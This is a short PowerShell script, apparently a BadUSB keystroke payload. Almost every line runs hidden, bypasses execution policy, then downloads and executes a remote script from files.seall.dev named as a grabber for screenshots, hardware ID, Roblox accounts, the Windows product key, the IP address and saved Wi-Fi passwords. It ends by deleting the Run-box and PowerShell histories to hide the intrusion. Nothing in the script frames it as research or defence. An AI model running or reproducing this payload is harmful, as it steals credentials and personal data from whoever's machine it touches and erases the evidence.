powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/ScreenshotGrabber.ps1 | iex
Clear-Clipboard
powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/HwidGrabber.ps1 | iex
powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/RobloxGrabber.ps1 | iex
powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/WinKeyGrabber.ps1 | iex
powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/IpGrabber.ps1 | iex
powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/WifiGrabber.ps1 | iex

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath